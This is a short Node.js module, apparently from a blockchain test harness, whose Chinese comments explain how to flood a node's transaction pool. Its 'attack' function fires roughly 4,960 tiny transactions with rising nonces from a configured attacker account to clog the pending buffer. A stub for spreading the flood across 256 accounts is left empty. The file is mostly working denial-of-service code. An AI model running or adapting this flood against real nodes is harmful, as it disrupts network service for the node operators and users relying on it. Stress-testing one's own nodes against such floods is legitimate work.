async function init(ea){
    let obj = {
        ea : ea,
    }

    /**
     * pending 缓冲区4096，queue 缓冲区1024，满了就会看看哪个账号有16+个交易，有就踢掉一些他的交易。
     * 攻击方式就是创造一大堆攻击账号，然后发16个交易，塞满pending。
     */
    async function attack(){
        let promiss = [];
        for(var i=40;i<5000;i++) {
            let result = ea.handle.sendTrans(ea.Config.attackers[0], ea.Config.attackers[1], 0.000001, i);
            promiss.push(result);
        }
        let result = await Promise.all(promiss);
        console.log(result);
        return ;
    }

    /**
     * 用256个账号，每个账号塞一条交易。
     */
    async function attackBy256Accounts(){

    }

    let handle = {
        attack : attack
    }

    obj.handle = handle;

    return obj;
}

module.exports = init;